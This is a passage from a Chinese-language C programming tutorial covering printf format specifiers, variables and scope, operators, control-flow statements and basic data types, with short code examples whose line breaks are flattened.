%llx：十六进制 long long int 类型。 %llu：unsigned long long int 类型。 %Le：科学计数法表示的 long double 类型浮点数。 %Lf：long double 类型浮点数。 %n：已输出的字符串数量。该占位符本身不输出，只将值存储在指定变量之中。 %o：八进制整数。 %p：指针。 %s：字符串。 %u：无符号整数（unsigned int）。 %x：十六进制整数。 %zd：size_t类型。 %%：输出一个百分号。 输出格式printf()可以定制占位符的输出格式。 （1）限定宽度 printf()允许限定占位符的最小宽度。 1printf(&quot;%5d\\n&quot;, 123); // 输出为 &quot; 123&quot; 上面示例中，%5d表示这个占位符的宽度至少为5位。如果不满5位，对应的值的前面会添加空格。 输出的值默认是右对齐，即输出内容前面会有空格；如果希望改成左对齐，在输出内容后面添加空格，可以在占位符的%的后面插入一个-号。 1printf(&quot;%-5d\\n&quot;, 123); // 输出为 &quot;123 &quot; 上面示例中，输出内容123的后面添加了空格。 对于小数，这个限定符会限制所有数字的最小显示宽度。 12// 输出 &quot; 123.450000&quot;printf(&quot;%12f\\n&quot;, 123.45); 上面示例中，%12f表示输出的浮点数最少要占据12位。由于小数的默认显示精度是小数点后6位，所以123.45输出结果的头部会添加2个空格。 （2）总是显示正负号 默认情况下，printf()不对正数显示+号，只对负数显示-号。如果想让正数也输出+号，可以在占位符的%后面加一个+。 12printf(&quot;%+d\\n&quot;, 12); // 输出 +12printf(&quot;%+d\\n&quot;, -12); // 输出 -12 上面示例中，%+d可以确保输出的数值，总是带有正负号。 （3）限定小数位数 输出小数时，有时希望限定小数的位数。举例来说，希望小数点后面只保留两位，占位符可以写成%.2f。 12// 输出 Number is 0.50printf(&quot;Number is %.2f\\n&quot;, 0.5); 上面示例中，如果希望小数点后面输出3位（0.500），占位符就要写成%.3f。 这种写法可以与限定宽度占位符，结合使用。 12// 输出为 &quot; 0.50&quot;printf(&quot;%6.2f\\n&quot;, 0.5); 上面示例中，%6.2f表示输出字符串最小宽度为6，小数位数为2。所以，输出字符串的头部有两个空格。 最小宽度和小数位数这两个限定值，都可以用*代替，通过printf()的参数传入。 1234printf(&quot;%*.*f\\n&quot;, 6, 2, 0.5);// 等同于printf(&quot;%6.2f\\n&quot;, 0.5); 上面示例中，%*.*f的两个星号通过printf()的两个参数6和2传入。 （4）输出部分字符串 %s占位符用来输出字符串，默认是全部输出。如果只想输出开头的部分，可以用%.[m]s指定输出的长度，其中[m]代表一个数字，表示所要输出的长度。 12// 输出 helloprintf(&quot;%.5s\\n&quot;, &quot;hello world&quot;); 上面示例中，占位符%.5s表示只输出字符串“hello world”的前5个字符，即“hello”。 标准库，头文件程序需要用到的功能，不一定需要自己编写，C 语言可能已经自带了。程序员只要去调用这些自带的功能，就省得自己编写代码了。举例来说，printf()这个函数就是 C 语言自带的，只要去调用它，就能实现在屏幕上输出内容。 C 语言自带的所有这些功能，统称为“标准库”（standard library），因为它们是写入标准的，到底包括哪些功能，应该怎么使用的，都是规定好的，这样才能保证代码的规范和可移植。 不同的功能定义在不同的文件里面，这些文件统称为“头文件”（header file）。如果系统自带某一个功能，就一定还会自带描述这个功能的头文件，比如printf()的头文件就是系统自带的stdio.h。头文件的后缀通常是.h。 如果要使用某个功能，就必须先加载对应的头文件，加载使用的是#include命令。这就是为什么使用printf()之前，必须先加载stdio.h的原因。 1#include &lt;stdio.h&gt; 注意，加载头文件的#include语句不需要分号结尾，详见《预处理器》一章。 变量变量（variable）可以理解成一块内存区域的名字。通过变量名，可以引用这块内存区域，获取里面存储的值。由于值可能发生变化，所以称为变量，否则就是常量了。 变量名变量名在 C 语言里面属于标识符（identifier），命名有严格的规范。 只能由字母（包括大写和小写）、数字和下划线（_）组成。 不能以数字开头。 长度不能超过63个字符。 下面是一些无效变量名的例子。 123456$zjj**p2catHot-tabtax ratedon't 上面示例中，每一行的变量名都是无效的。 变量名区分大小写，star、Star、STAR都是不同的变量。 并非所有的词都能用作变量名，有些词在 C 语言里面有特殊含义（比如int），另一些词是命令（比如continue），它们都称为关键字，不能用作变量名。另外，C 语言还保留了一些词，供未来使用，这些保留字也不能用作变量名。下面就是 C 语言主要的关键字和保留字。 auto, break, case, char, const, continue, default, do, double, else, enum, extern, float, for, goto, if, inline, int, long, register, restrict, return, short, signed, sizeof, static, struct, switch, typedef, union, unsigned, void, volatile, while 另外，两个下划线开头的变量名，以及一个下划线 + 大写英文字母开头的变量名，都是系统保留的，自己不应该起这样的变量名。 变量的声明C 语言的变量，必须先声明后使用。如果一个变量没有声明，就直接使用，会报错。 每个变量都有自己的类型（type）。声明变量时，必须把变量的类型告诉编译器。 1int height; 上面代码声明了变量height，并且指定类型为int（整数）。 如果几个变量具有相同类型，可以在同一行声明。 12345int height, width;// 等同于int height;int width; 注意，声明变量的语句必须以分号结尾。 一旦声明，变量的类型就不能在运行时修改。 变量的赋值C 语言会在变量声明时，就为它分配内存空间，但是不会清除内存里面原来的值。这导致声明变量以后，变量会是一个随机的值。所以，变量一定要赋值以后才能使用。 赋值操作通过赋值运算符（=）完成。 12int num;num = 42; 上面示例中，第一行声明了一个整数变量num，第二行给这个变量赋值。 变量的值应该与类型一致，不应该赋予不是同一个类型的值，比如num的类型是整数，就不应该赋值为小数。虽然 C 语言会自动转换类型，但是应该避免赋值运算符两侧的类型不一致。 变量的声明和赋值，也可以写在一行。 1int num = 42; 多个相同类型变量的赋值，可以写在同一行。 1int x = 1, y = 2; 注意，赋值表达式有返回值，等于等号右边的值。 1234int x, y;x = 1;y = (x = 2 * x); 上面代码中，变量y的值就是赋值表达式（x = 2 * x）的返回值2。 由于赋值表达式有返回值，所以 C 语言可以写出多重赋值表达式。 123int x, y, z, m, n;x = y = z = m = n = 3; 上面的代码是合法代码，一次为多个变量赋值。赋值运算符是从右到左执行，所以先为n赋值，然后依次为m、z、y和x赋值。 C 语言有左值（left value）和右值（right value）的概念。左值是可以放在赋值运算符左边的值，一般是变量；右值是可以放在赋值运算符右边的值，一般是一个具体的值。这是为了强调有些值不能放在赋值运算符的左边，比如x = 1是合法的表达式，但是1 = x就会报错。 变量的作用域作用域（scope）指的是变量生效的范围。C 语言的变量作用域主要有两种：文件作用域（file scope）和块作用域（block scope）。 文件作用域（file scope）指的是，在源码文件顶层声明的变量，从声明的位置到文件结束都有效。 12345int x = 1;int main(void) { printf(&quot;%i\\n&quot;, x);} 上面示例中，变量x是在文件顶层声明的，从声明位置开始的整个当前文件都是它的作用域，可以在这个范围的任何地方读取这个变量，比如函数main()内部就可以读取这个变量。 块作用域（block scope）指的是由大括号（{}）组成的代码块，它形成一个单独的作用域。凡是在块作用域里面声明的变量，只在当前代码块有效，代码块外部不可见。 123456789int a = 12;if (a == 12) { int b = 99; printf(&quot;%d %d\\n&quot;, a, b); // 12 99}printf(&quot;%d\\n&quot;, a); // 12printf(&quot;%d\\n&quot;, b); // 出错 上面例子中，变量b是在if代码块里面声明的，所以对于大括号外面的代码，这个变量是不存在的。 代码块可以嵌套，即代码块内部还有代码块，这时就形成了多层的块作用域。它的规则是：内层代码块可以使用外层声明的变量，但外层不可以使用内层声明的变量。如果内层的变量与外层同名，那么会在当前作用域覆盖外层变量。 12345678910{ int i = 10; { int i = 20; printf(&quot;%d\\n&quot;, i); // 20 } printf(&quot;%d\\n&quot;, i); // 10} 上面示例中，内层和外层都有一个变量i，每个作用域都会优先使用当前作用域声明的i。 最常见的块作用域就是函数，函数内部声明的变量，对于函数外部是不可见的。for循环也是一个块作用域，循环变量只对循环体内部可见，外部是不可见的。 1234for (int i = 0; i &lt; 10; i++) printf(&quot;%d\\n&quot;, i);printf(&quot;%d\\n&quot;, i); // 出错 上面示例中，for循环省略了大括号，但依然是一个块作用域，在外部读取循环变量i，编译器就会报错。 运算符C 语言的运算符非常多，一共有 50 多种，可以分成若干类。 算术运算符算术运算符专门用于算术运算，主要有下面几种。 +：正值运算符（一元运算符） -：负值运算符（一元运算符） +：加法运算符（二元运算符） -：减法运算符（二元运算符） *：乘法运算符 /：除法运算符 %：余值运算符 （1）+，- +和-既可以作为一元运算符，也可以作为二元运算符。所谓“一元运算符”，指的是只需要一个运算数就可以执行。一元运算符-用来改变一个值的正负号。 1int x = -12; 上面示例中，-将12这个值变成-12。 一元运算符+对正负值没有影响，是一个完全可以省略的运算符，但是写了也不会报错。 12int x = -12;int y = +x; 上面示例中，变量y的值还是-12，因为+不会改变正负值。 二元运算符+和-用来完成加法和减法。 12int x = 4 + 22;int y = 61 - 23; （2）* 运算符*用来完成乘法。 12int num = 5;printf(&quot;%i\\n&quot;, num * num); // 输出 25 （3）/ 运算符/用来完成除法。注意，两个整数相除，得到还是一个整数。 12float x = 6 / 4;printf(&quot;%f\\n&quot;, x); // 输出 1.000000 上面示例中，尽管变量x的类型是float（浮点数），但是6 / 4得到的结果是1.0，而不是1.5。原因就在于 C 语言里面的整数除法是整除，只会返回整数部分，丢弃小数部分。 如果希望得到浮点数的结果，两个运算数必须至少有一个浮点数，这时 C 语言就会进行浮点数除法。 12float x = 6.0 / 4; // 或者写成 6 / 4.0printf(&quot;%f\\n&quot;, x); // 输出 1.500000 上面示例中，6.0 / 4表示进行浮点数除法，得到的结果就是1.5。 下面是另一个例子。 12int score = 5;score = (score / 20) * 100; 上面的代码，你可能觉得经过运算，score会等于25，但是实际上score等于0。这是因为score / 20是整除，会得到一个整数值0，所以乘以100后得到的也是0。 为了得到预想的结果，可以将除数20改成20.0，让整除变成浮点数除法。 1score = (score / 20.0) * 100; （4）% 运算符%表示求模运算，即返回两个整数相除的余值。这个运算符只能用于整数，不能用于浮点数。 1int x = 6 % 4; // 2 负数求模的规则是，结果的正负号由第一个运算数的正负号决定。 12311 % -5 // 1-11 % -5 // -1-11 % 5 // -1 上面示例中，第一个运算数的正负号（11或-11）决定了结果的正负号。 （5）赋值运算的简写形式 如果变量对自身的值进行算术运算，C 语言提供了简写形式，允许将赋值运算符和算术运算符结合成一个运算符。 += -= *= /= %= 下面是一些例子。 12345i += 3; // 等同于 i = i + 3i -= 8; // 等同于 i = i - 8i *= 9; // 等同于 i = i * 9i /= 2; // 等同于 i = i / 2i %= 5; // 等同于 i = i % 5 自增运算符，自减运算符C 语言提供两个运算符，对变量自身进行+ 1和- 1的操作。 ++：自增运算符 --：自减运算符 12i++; // 等同于 i = i + 1i--; // 等同于 i = i - 1 这两个运算符放在变量的前面或后面，结果是不一样的。++var和--var是先执行自增或自减操作，再返回操作后var的值；var++和var--则是先返回操作前var的值，再执行自增或自减操作。 12345678910int i = 42;int j;j = (i++ + 10);// i: 43// j: 52j = (++i + 10)// i: 44// j: 54 上面示例中，自增运算符的位置差异，会导致变量j得到不同的值。这样的写法很容易出现意料之外的结果，为了消除意外，可以改用下面的写法。 1234567/* 写法一 */j = (i + 10);i++;/* 写法二 */i++;j = (i + 10); 上面示例中，变量i的自增运算与返回值是分离的两个步骤，这样就不太会出错，也提高了代码的可读性。 关系运算符C 语言用于比较的表达式，称为“关系表达式”（relational expression），里面使用的运算符就称为“关系运算符”（relational operator），主要有下面6个。 &gt; 大于运算符 &lt; 小于运算符 &gt;= 大于等于运算符 &lt;= 小于等于运算符 == 相等运算符 != 不相等运算符 下面是一些例子。 123456a == b;a != b;a &lt; b;a &gt; b;a &lt;= b;a &gt;= b; 关系表达式通常返回0或1，表示真伪。C 语言中，0表示伪，所有非零值表示真。比如，20 &gt; 12返回1，12 &gt; 20返回0。 关系表达式常用于if或while结构。 123if (x == 3) { printf(&quot;x is 3.\\n&quot;);} 注意，相等运算符==与赋值运算符=是两个不一样的运算符，不要混淆。有时候，可能会不小心写出下面的代码，它可以运行，但很容易出现意料之外的结果。 1if (x = 3) ... 上面示例中，原意是x == 3，但是不小心写成x = 3。这个式子表示对变量x赋值3，它的返回值为3，所以if判断总是为真。 为了防止出现这种错误，有的程序员喜欢将变量写在等号的右边。 1if (3 == x) ... 这样的话，如果把==误写成=，编译器就会报错。 12/* 报错 */if (3 = x) ... 另一个需要避免的错误是，多个关系运算符不宜连用。 1i &lt; j &lt; k 上面示例中，连续使用两个小于运算符。这是合法表达式，不会报错，但是通常达不到想要的结果，即不是保证变量j的值在i和k之间。因为关系运算符是从左到右计算，所以实际执行的是下面的表达式。 1(i &lt; j) &lt; k 上面式子中，i &lt; j返回0或1，所以最终是0或1与变量k进行比较。如果想要判断变量j的值是否在i和k之间，应该使用下面的写法。 1i &lt; j &amp;&amp; j &lt; k 逻辑运算符逻辑运算符提供逻辑判断功能，用于构建更复杂的表达式，主要有下面三个运算符。 !：否运算符（改变单个表达式的真伪）。 &amp;&amp;：与运算符（两侧的表达式都为真，则为真，否则为伪）。 ||：或运算符（两侧至少有一个表达式为真，则为真，否则为伪）。 下面是与运算符的例子。 12if (x &lt; 10 &amp;&amp; y &gt; 20) printf(&quot;Doing something!\\n&quot;); 上面示例中，只有x &lt; 10和y &gt; 20同时为真，x &lt; 10 &amp;&amp; y &gt; 20才会为真。 下面是否运算符的例子。 12if (!(x &lt; 12)) printf(&quot;x is not less than 12\\n&quot;); 上面示例中，由于否运算符!具有比&lt;更高的优先级，所以必须使用括号，才能对表达式x &lt; 12进行否运算。当然，合理的写法是if (x &gt;= 12)，这里只是为了举例。 对于逻辑运算符来说，任何非零值都表示真，零值表示伪。比如，5 || 0会返回1，5 &amp;&amp; 0会返回0。 逻辑运算符还有一个特点，它总是先对左侧的表达式求值，再对右边的表达式求值，这个顺序是保证的。如果左边的表达式满足逻辑运算符的条件，就不再对右边的表达式求值。这种情况称为“短路”。 1if (number != 0 &amp;&amp; 12/number == 2) 上面示例中，如果&amp;&amp;左侧的表达式（number != 0）为伪，即number等于0时，右侧的表达式（12/number == 2）是不会执行的。因为这时左侧表达式返回0，整个&amp;&amp;表达式肯定为伪，就直接返回0，不再执行右侧的表达式了。 由于逻辑运算符的执行顺序是先左后右，所以下面的代码是有问题的。 1while ((x++ &lt; 10) &amp;&amp; (x + y &lt; 20)) 上面示例中，执行左侧表达式后，变量x的值就已经变了。等到执行右侧表达式的时候，是用新的值在计算，这通常不是原始意图。 位运算符C 语言提供一些位运算符，用来操作二进制位（bit）。 （1）取反运算符～ 取反运算符～是一个一元运算符，用来将每一个二进制位变成相反值，即0变成1，1变成0。 12// 返回 01101100~ 10010011 上面示例中，~对每个二进制位取反，就得到了一个新的值。 注意，~运算符不会改变变量的值，只是返回一个新的值。 （2）与运算符&amp; 与运算符&amp;将两个值的每一个二进制位进行比较，返回一个新的值。当两个二进制位都为1，就返回1，否则返回0。 12// 返回 0001000110010011 &amp; 00111101 上面示例中，两个八位二进制数进行逐位比较，返回一个新的值。 与运算符&amp;可以与赋值运算符=结合，简写成&amp;=。 12345int val = 3;val = val &amp; 0377;// 简写成val &amp;= 0377; （3）或运算符| 或运算符|将两个值的每一个二进制位进行比较，返回一个新的值。两个二进制位只要有一个为1（包含两个都为1的情况），就返回1，否则返回0。 12// 返回 1011111110010011 | 00111101 或运算符|可以与赋值运算符=结合，简写成|=。 12345int val = 3;val = val | 0377;// 简写为val |= 0377; （4）异或运算符^ 异或运算符^将两个值的每一个二进制位进行比较，返回一个新的值。两个二进制位有且仅有一个为1，就返回1，否则返回0。 12// 返回 1010111010010011 ^ 00111101 异或运算符^可以与赋值运算符=结合，简写成^=。 12345int val = 3;val = val ^ 0377;// 简写为val ^= 0377; （5）左移运算符&lt;&lt; 左移运算符&lt;&lt;将左侧运算数的每一位，向左移动指定的位数，尾部空出来的位置使用0填充。 12// 100010100010001010 &lt;&lt; 2 上面示例中，10001010的每一个二进制位，都向左侧移动了两位。 左移运算符相当于将运算数乘以2的指定次方，比如左移2位相当于乘以4（2的2次方）。 左移运算符&lt;&lt;可以与赋值运算符=结合，简写成&lt;&lt;=。 12345int val = 1;val = val &lt;&lt; 2;// 简写为val &lt;&lt;= 2; （6）右移运算符&gt;&gt; 右移运算符&gt;&gt;将左侧运算数的每一位，向右移动指定的位数，尾部无法容纳的值将丢弃，头部空出来的位置使用0填充。 12// 返回 0010001010001010 &gt;&gt; 2 上面示例中，10001010的每一个二进制位，都向右移动两位。最低的两位10被丢弃，头部多出来的两位补0，所以最后得到00100010。 注意，右移运算符最好只用于无符号整数，不要用于负数。因为不同系统对于右移后如何处理负数的符号位，有不同的做法，可能会得到不一样的结果。 右移运算符相当于将运算数除以2的指定次方，比如右移2位就相当于除以4（2的2次方）。 右移运算符&gt;&gt;可以与赋值运算符=结合，简写成&gt;&gt;=。 12345int val = 1;val = val &gt;&gt; 2;// 简写为val &gt;&gt;= 2; 逗号运算符逗号运算符用于将多个表达式写在一起，从左到右依次运行每个表达式。 1x = 10, y = 20; 上面示例中，有两个表达式（x = 10和y = 20），逗号使得它们可以放在同一条语句里面。 逗号运算符返回最后一个表达式的值，作为整个语句的值。 12int x;x = 1, 2, 3; 上面示例中，逗号的优先级低于赋值运算符，所以先执行赋值运算，再执行逗号运算，变量x等于1。 运算优先级优先级指的是，如果一个表达式包含多个运算符，哪个运算符应该优先执行。各种运算符的优先级是不一样的。 13 + 4 * 5; 上面示例中，表达式3 + 4 * 5里面既有加法运算符（+），又有乘法运算符（*）。由于乘法的优先级高于加法，所以会先计算4 * 5，而不是先计算3 + 4。 如果两个运算符优先级相同，则根据运算符是左结合，还是右结合，决定执行顺序。大部分运算符是左结合（从左到右执行），少数运算符是右结合（从右到左执行），比如赋值运算符（=）。 15 * 6 / 2; 上面示例中，*和/的优先级相同，它们都是左结合运算符，所以从左到右执行，先计算5 * 6，再计算6 / 2。 运算符的优先级顺序很复杂。下面是部分运算符的优先级顺序（按照优先级从高到低排列）。 圆括号（()） 自增运算符（++），自减运算符（--） 一元运算符（+和-） 乘法（*），除法（/） 加法（+），减法（-） 关系运算符（&lt;、&gt;等） 赋值运算符（=） 由于圆括号的优先级最高，可以使用它改变其他运算符的优先级。 1int x = (3 + 4) * 5; 上面示例中，由于添加了圆括号，加法会先于乘法进行运算。 完全记住所有运算符的优先级没有必要，解决方法是多用圆括号，防止出现意料之外的情况，也有利于提高代码的可读性。 流程控制C 语言的程序是顺序执行，即先执行前面的语句，再执行后面的语句。开发者如果想要控制程序执行的流程，就必须使用流程控制的语法结构，主要是条件执行和循环执行。 if 语句if语句用于条件判断，满足条件时，就执行指定的语句。 1if (expression) statement 上面式子中，表达式expression为真（值不为0）时，就执行statement语句。 if后面的判断条件expression外面必须有圆括号，否则会报错。语句体部分statement可以是一个语句，也可以是放在大括号里面的复合语句。下面是一个例子。 1if (x == 10) printf(&quot;x is 10&quot;); 上面示例中，当变量x为10时，就会输出一行文字。对于只有一个语句的语句体，语句部分通常另起一行。 12if (x == 10) printf(&quot;x is 10\\n&quot;); 如果有多条语句，就需要把它们放在大括号里面，组成一个复合语句。 1234if (line_num == MAX_LINES) { line_num = 0; page_num++;} if语句可以带有else分支，指定条件不成立时（表达式expression的值为0），所要执行的代码。 12if (expression) statementelse statement 下面是一个例子。 1234if (i &gt; j) max = i;else max = j; 如果else的语句部分多于一行，同样可以把它们放在大括号里面。 else可以与另一个if语句连用，构成多重判断。 123456789if (expression) statementelse if (expression) statement...else if (expression) statementelse statement 如果有多个if和else，可以记住这样一条规则，else总是跟最接近的if匹配。 12345if (number &gt; 6) if (number &lt; 12) printf(&quot;The number is more than 6, less than 12.\\n&quot;);else printf(&quot;It is wrong number.\\n&quot;); 上面示例中，else部分匹配最近的if（即number &lt; 12），所以如果number等于6，就不会执行else的部分。 这样很容易出错，为了提供代码的可读性，建议使用大括号，明确else匹配哪一个if。 1234567if (number &gt; 6) { if (number &lt; 12) { printf(&quot;The number is more than 6, less than 12.\\n&quot;); }} else { printf(&quot;It is wrong number.\\n&quot;);} 上面示例中，使用了大括号，就可以清晰地看出else匹配外层的if。 三元运算符 ?C 语言有一个三元表达式?:，可以用作if...else的简写形式。 1&lt;expression1&gt; ? &lt;expression2&gt; : &lt;expression3&gt; 这个操作符的含义是，表达式expression1如果为true（非0值），就执行expression2，否则执行expression3。 下面是一个例子，返回两个值之中的较大值。 1(i &gt; j) ? i : j; 上面的代码等同于下面的if语句。 1234if (i &gt; j) return i;else return j; switch 语句switch 语句是一种特殊形式的 if…else 结构，用于判断条件有多个结果的情况。它把多重的else if改成更易用、可读性更好的形式。 12345switch (expression) { case value1: statement case value2: statement default: statement} 上面代码中，根据表达式expression不同的值，执行相应的case分支。如果找不到对应的值，就执行default分支。 下面是一个例子。 12345678910switch (grade) { case 0: printf(&quot;False&quot;); break; case 1: printf(&quot;True&quot;); break; default: printf(&quot;Illegal&quot;);} 上面示例中，根据变量grade不同的值，会执行不同的case分支。如果等于0，执行case 0的部分；如果等于1，执行case 1的部分；否则，执行default的部分。default表示处理以上所有case都不匹配的情况。 每个case语句体的结尾，都应该有一个break语句，作用是跳出整个switch结构，不再往下执行。如果缺少break，就会导致继续执行下一个case或default分支。 123456789switch (grade) { case 0: printf(&quot;False&quot;); case 1: printf(&quot;True&quot;); break; default: printf(&quot;Illegal&quot;);} 上面示例中，case 0的部分没有break语句，导致这个分支执行完以后，不会跳出switch结构，继续执行case 1分支。 利用这个特点，如果多个case分支对应同样的语句体，可以写成下面这样。 12345678switch (grade) { case 0: case 1: printf(&quot;True&quot;); break; default: printf(&quot;Illegal&quot;);} 上面示例中，case 0分支没有任何语句，导致case 0和case 1都会执行同样的语句体。 case后面的语句体，不用放在大括号里面，这也是为什么需要break的原因。 default分支用来处理前面的 case 都不匹配的情况，最好放在所有 case 的后面，这样就不用写break语句。这个分支是可选的，如果没有该分支，遇到所有的 case 都不匹配的情况，就会直接跳出整个 switch 代码块。 while 语句while语句用于循环结构，满足条件时，不断执行循环体。 12while (expression) statement 上面代码中，如果表达式expression为非零值（表示真），就会执行statement语句，然后再次判断expression是否为零；如果expression为零（表示伪）就跳出循环，不再执行循环体。 12while (i &lt; n) i = i + 2; 上面示例中，只要i小于n，i就会不断增加2。 如果循环体有多个语句，就需要使用大括号将这些语句组合在一起。 1234while (expression) { statement; statement;} 下面是一个例子。 12345678i = 0;while (i &lt; 10) { printf(&quot;i is now %d!\\n&quot;, i); i++;}printf(&quot;All done!\\n&quot;); 上面代码中，循环体会执行10次，每次将i增加1，直到等于10才退出循环。 只要条件为真，while会产生无限循环。下面是一种常见的无限循环的写法。 123while (1) { // ...} 上面的示例虽然是无限循环，但是循环体内部可以用break语句跳出循环。 do…while 结构do...while结构是while的变体，它会先执行一次循环体，然后再判断是否满足条件。如果满足的话，就继续执行循环体，否则跳出循环。 12do statementwhile (expression); 上面代码中，不管条件expression是否成立，循环体statement至少会执行一次。每次statement执行完毕，就会判断一次expression，决定是否结束循环。 1234i = 10;do --i;while (i &gt; 0); 上面示例中，变量i先减去1，再判断是否大于0。如果大于0，就继续减去1，直到i等于0为止。 如果循环部分有多条语句，就需要放在大括号里面。 12345678i = 10;do { printf(&quot;i is %d\\n&quot;, i); i++;} while (i &lt; 10);printf(&quot;All done!\\n&quot;); 上面例子中，变量i并不满足小于10的条件，但是循环体还是会执行一次。 for 语句for语句是最常用的循环结构，通常用于精确控制循环次数。 12for (initialization; continuation; action) statement; 上面代码中，for语句的条件部分（即圆括号里面的部分）有三个表达式。 initialization：初始化表达式，用于初始化循环变量，只执行一次。 continuation：判断表达式，只要为true，就会不断执行循环体。 action：循环变量处理表达式，每轮循环结束后执行，使得循环变量发生变化。 循环体部分的statement可以是一条语句，也可以是放在大括号里面的复合语句。下面是一个例子。 12for (int i = 10; i &gt; 0; i--) printf(&quot;i is %d\\n&quot;, i); 上面示例中，循环变量i在for的第一个表达式里面声明，该变量只用于本次循环。离开循环体之后，就会失效。 条件部分的三个表达式，每一个都可以有多个语句，语句与语句之间使用逗号分隔。 1234int i, j;for (i = 0, j = 999; i &lt; 10; i++, j--) { printf(&quot;%d, %d\\n&quot;, i, j);} 上面示例中，初始化部分有两个语句，分别对变量i和j进行赋值。 for的三个表达式都不是必需的，甚至可以全部省略，这会形成无限循环。 123for (;;) { printf(&quot;本行会无限循环地打印。\\n&quot; );} 上面示例由于没有判断条件，就会形成无限循环。 break 语句break语句有两种用法。一种是与switch语句配套使用，用来中断某个分支的执行，这种用法前面已经介绍过了。另一种用法是在循环体内部跳出循环，不再进行后面的循环了。 123456for (int i = 0; i &lt; 3; i++) { for (int j = 0; j &lt; 3; j++) { printf(&quot;%d, %d\\n&quot;, i, j); break; }} 上面示例中，break语句使得循环跳到下一个i。 1234while ((ch = getchar()) != EOF) { if (ch == '\\n') break; putchar(ch);} 上面示例中，一旦读到换行符（\\n），break命令就跳出整个while循环，不再继续读取了。 注意，break命令只能跳出循环体和switch结构，不能跳出if结构。 1234if (n &gt; 1) { if (n &gt; 2) break; // 无效 printf(&quot;hello\\n&quot;);} 上面示例中，break语句是无效的，因为它不能跳出外层的if结构。 continue 语句continue语句用于在循环体内部终止本轮循环，进入下一轮循环。只要遇到continue语句，循环体内部后面的语句就不执行了，回到循环体的头部，开始执行下一轮循环。 123456for (int i = 0; i &lt; 3; i++) { for (int j = 0; j &lt; 3; j++) { printf(&quot;%d, %d\\n&quot;, i, j); continue; }} 上面示例中，有没有continue语句，效果一样，都表示跳到下一个j。 1234while ((ch = getchar()) != '\\n') { if (ch == '\\t') continue; putchar(ch);} 上面示例中，只要读到的字符是制表符（\\t），就用continue语句跳过该字符，读取下一个字符。 goto 语句goto 语句用于跳到指定的标签名。这会破坏结构化编程，建议不要轻易使用，这里为了语法的完整，介绍一下它的用法。 123456char ch;top: ch = getchar();if (ch == 'q') goto top; 上面示例中，top是一个标签名，可以放在正常语句的前面，相当于为这行语句做了一个标记。程序执行到goto语句，就会跳转到它指定的标签名。 123infinite_loop: print(&quot;Hello, world!\\n&quot;); goto infinite_loop; 上面的代码会产生无限循环。 goto 的一个主要用法是跳出多层循环。 12345678910111213for(...) { for (...) { while (...) { do { if (some_error_condition) goto bail; } while(...); } }} bail:// ... ... 上面代码有很复杂的嵌套循环，不使用 goto 的话，想要完全跳出所有循环，写起来很麻烦。 goto 的另一个用途是提早结束多重判断。 12345678if (do_something() == ERR) goto error;if (do_something2() == ERR) goto error;if (do_something3() == ERR) goto error;if (do_something4() == ERR) goto error; 上面示例有四个判断，只要有一个发现错误，就使用 goto 跳过后面的判断。 注意，goto 只能在同一个函数之中跳转，并不能跳转到其他函数。 数据类型C 语言的每一种数据，都是有类型（type）的，编译器必须知道数据的类型，才能操作数据。所谓“类型”，就是相似的数据所拥有的共同特征，那么一旦知道某个值的数据类型，就能知道该值的特征和操作方式。 基本数据类型有三种：字符（char）、整数（int）和浮点数（float）。复杂的类型都是基于它们构建的。 字符类型字符类型指的是单个字符，类型声明使用char关键字。 1char c = 'B'; 上面示例声明了变量c是字符类型，并将其赋值为字母B。 C 语言规定，字符常量必须放在单引号里面。 在计算机内部，字符类型使用一个字节（8位）存储。C 语言将其当作整数处理，所以字符类型就是宽度为一个字节的整数。每个字符对应一个整数（由 ASCII 码确定），比如B对应整数66。 字符类型在不同计算机的默认范围是不一样的。一些系统默认为-128到127，另一些系统默认为0到255。这两种范围正好都能覆盖0到127的 ASCII 字符范围。 只要在字符类型的范围之内，整数与字符是可以互换的，都可以赋值给字符类型的变量。 123char c = 66;// 等同于char c = 'B'; 上面示例中，变量c是字符类型，赋给它的值是整数66。这跟赋值为字符B的效果是一样的。 两个字符类型的变量可以进行数学运算。 1234char a = 'B'; // 等同于 char a = 66;char b = 'C'; // 等同于 char b = 67;printf(&quot;%d\\n&quot;, a + b); // 输出 133 上面示例中，字符类型变量a和b相加，视同两个整数相加。占位符%d表示输出十进制整数，因此输出结果为133。 单引号本身也是一个字符，如果要表示这个字符常量，必须使用反斜杠转义。 1char t = '\\''; 上面示例中，变量t为单引号字符，由于字符常量必须放在单引号里面，所以内部的单引号要使用反斜杠转义。 这种转义的写法，主要用来表示 ASCII 码定义的一些无法打印的控制字符，它们也属于字符类型的值。 \\a：警报，这会使得终端发出警报声或出现闪烁，或者两者同时发生。 \\b：退格键，光标回退一个字符，但不删除字符。 \\f：换页符，光标移到下一页。在现代系统上，这已经反映不出来了，行为改成类似于\\v。 \\n：换行符。 \\r：回车符，光标移到同一行的开头。 \\t：制表符，光标移到下一个水平制表位，通常是下一个8的倍数。 \\v：垂直分隔符，光标移到下一个垂直制表位，通常是下一行的同一列。 \\0：null 字符，代表没有内容。注意，这个值不等于数字0。 转义写法还能使用八进制和十六进制表示一个字符。 \\nn：字符的八进制写法，nn为八进制值。 \\xnn：字符的十六进制写法，nn为十六进制值。 1234char x = 'B';char x = 66;char x = '\\102'; // 八进制char x = '\\x42'; // 十六进制 上面示例的四种写法都是等价的。 整数类型简介整数类型用来表示较大的整数，类型声明使用int关键字。 1int a; 上面示例声明了一个整数变量a。 不同计算机的int类型的大小是不一样的。比较常见的是使用4个字节（32位）存储一个int类型的值，但是2个字节（16位）或8个字节（64位）也有可能使用。它们可以表示的整数范围如下。 16位：-32,768 到 32,767。 32位：-2,147,483,648 到 2,147,483,647。 64位：-9,223,372,036,854,775,808 到 9,223,372,036,854,775,807。 signed，unsignedC 语言使用signed关键字，表示一个类型带有正负号，包含负值；使用unsigned关键字，表示该类型不带有正负号，只能表示零和正整数。 对于int类型，默认是带有正负号的，也就是说int等同于signed int。由于这是默认情况，关键字signed一般都省略不写，但是写了也不算错。 123signed int a;// 等同于int a; int类型也可以不带正负号，只表示非负整数。这时就必须使用关键字unsigned声明变量。 1unsigned int a; 整数变量声明为unsigned的好处是，同样长度的内存能够表示的最大整数值，增大了一倍。比如，16位的signed int最大值为32,767，而unsigned int的最大值增大到了65,535。 unsigned int里面的int可以省略，所以上面的变量声明也可以写成下面这样。 1unsigned a; 字符类型char也可以设置signed和unsigned。 12signed char c; // 范围为 -128 到 127unsigned char c; // 范围为 0 到 255 注意，C 语言规定char类型默认是否带有正负号，由当前系统决定。这就是说，char不等同于signed char，它有可能是signed char，也有可能是unsigned 